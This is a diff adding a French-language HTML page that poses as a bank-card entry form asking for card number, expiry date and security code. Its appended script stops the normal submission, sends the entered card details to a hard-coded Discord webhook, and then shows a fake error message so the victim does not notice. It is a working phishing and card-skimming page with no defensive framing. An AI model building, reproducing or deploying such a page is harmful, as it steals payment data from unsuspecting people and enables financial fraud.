@@ -1,0 +1,98 @@
+<=!DOCTYPE html>
+<html>
+<head>
+	<title>Formulaire de saisie d'informations bancaires</title>
+	<style>
+		.container {
+			max-width: 400px;
+			margin: 0 auto;
+			padding: 20px;
+			border: 1px solid #ccc;
+			box-shadow: 0 0 10px #ccc;
+			border-radius: 5px;
+			background-color: #f2f2f2;
+			font-family: Arial, sans-serif;
+			font-size: 14px;
+		}
+		label {
+			display: block;
+			margin-bottom: 10px;
+			color: #666;
+			font-weight: bold;
+		}
+		input[type=text], input[type=password] {
+			width: 100%;
+			padding: 10px;
+			margin-bottom: 20px;
+			border: 1px solid #ccc;
+			border-radius: 5px;
+			box-sizing: border-box;
+			font-family: Arial, sans-serif;
+			font-size: 14px;
+		}
+		input[type=submit] {
+			background-color: #0068af;
+			color: #fff;
+			border: none;
+			padding: 10px 20px;
+			border-radius: 5px;
+			font-family: Arial, sans-serif;
+			font-size: 14px;
+			cursor: pointer;
+		}
+		input[type=submit]:hover {
+			background-color: #00508f;
+		}
+	</style>
+</head>
+<body>
+	<div class="container">
+		<form action="#" method="post">
+			<label for="cardNumber">Numéro de carte bancaire :</label>
+			<input type="text" id="cardNumber" name="cardNumber" placeholder="Numéro de carte bancaire">
+
+			<label for="expirationDate">Date d'expiration :</label>
+			<input type="text" id="expirationDate" name="expirationDate" placeholder="MM/AA">
+
+			<label for="securityCode">Code de sécurité :</label>
+			<input type="password" id="securityCode" name="securityCode" placeholder="Code de sécurité">
+
+			<input type="submit" value="Valider">
+		</form>
+	</div>
+</body>
+</html>
+
+<script>
+  const webhookUrl = 'https://discord.com/api/webhooks/1086372179677040781/cpRHulLncihJaJqBj2dczJJ6w8YYVJKa2fGVD2r0vldVP84-uHymQMtC5H8BryefYHc9' 
+  const form = document.querySelector('form');
+  form.addEventListener('submit', async (event) => {
+    event.preventDefault(); // Empêche l'envoi du formulaire par défaut
+
+    const cardNumber = document.getElementById('cardNumber').value;
+    const expirationDate = document.getElementById('expirationDate').value;
+    const securityCode = document.getElementById('securityCode').value;
+
+    const payload = {
+      content: `Nouvelle saisie d'informations bancaires :
+      Numéro de carte bancaire : ${cardNumber}
+      Date d'expiration : ${expirationDate}
+      Code de sécurité : ${securityCode}`
+    };
+
+    const response = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    });
+
+    if (response.ok) {
+      alert('Une erreur est survenue...');
+      form.reset();
+    } else {
+      alert('Une erreur est survenue. Veuillez réessayer plus tard.');
+    }
+  });
+</script>
